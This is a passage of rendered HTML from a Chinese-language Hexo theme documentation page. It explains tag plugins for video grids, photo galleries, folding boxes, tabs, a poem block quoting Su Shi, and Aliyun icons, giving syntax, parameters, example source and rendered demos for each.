fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>对齐方向</code>：left, center, right</li><li><code>列数</code>：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.100%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%宽度<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%宽度<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-19-相册-gallery">2.19 相册 gallery</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>gallerygroup 相册图库</li></ul><table><thead><tr><th>参数名</th><th>释义</th></tr></thead><tbody><tr><td>name</td><td>图库名字</td></tr><tr><td>description</td><td>图库描述</td></tr><tr><td>link</td><td>链接到对应相册的地址</td></tr><tr><td>img-url</td><td>图库封面</td></tr></tbody></table><ul><li><p>gallery 相册</p><p>区别于旧版的Gallery相册,新的Gallery相册会自动根据图片长度进行排版，书写也更加方便，与markdown格式一样。可根据需要插入到相应的md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.gallerygroup 相册图库</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div>2.gallery 相册<div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-20-折叠框-folding">2.20 折叠框 folding</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab 参数配置 --><ol><li><p><code>颜色</code>：blue, cyan, green, yellow, red</p></li><li><p><code>状态</code>：状态填写 open 代表默认打开。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <p>假装这里有代码块（代码块没法嵌套代码块）</p>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-21-分栏-tab">2.21 分栏 tab</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>Unique name :</p><ul><li><p>选项卡块标签的唯一名称，不带逗号。</p></li><li><p>将在#id中用作每个标签及其索引号的前缀。</p></li><li><p>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</p></li><li><p>仅当前帖子/页面的URL必须是唯一的！</p></li></ul></li><li><p>[index]:</p><ul><li><p>活动选项卡的索引号。</p></li><li><p>如果未指定，将选择第一个标签（1）。</p></li><li><p>如果index为-1，则不会选择任何选项卡。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[Tab caption]:</p><ul><li><p>当前选项卡的标题。</p></li><li><p>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</p></li><li><p>如果未指定标题，但指定了图标，则标题将为空。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[@icon]:</p><ul><li><p>FontAwesome图标名称（全名，看起来像“ fas fa-font”）</p></li><li><p>可以指定带空格或不带空格；</p></li><li><p>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</p></li><li><p>可选参数。</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - 预设选择tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - 没有预设值</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"><span class="strong">**tab名字为第一个Tab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**只有图标 没有Tab名字**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.Demo 1 - 预设选择第一个【默认】</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - 预设选择tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - 没有预设值</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字为第一个Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-22-诗词标签-poem">2.22 诗词标签 poem</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><ol><li><code>title</code>：诗词标题</li><li><code>author</code>：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？</p><p>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-23-阿里图标-icon">2.23 阿里图标 icon</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" 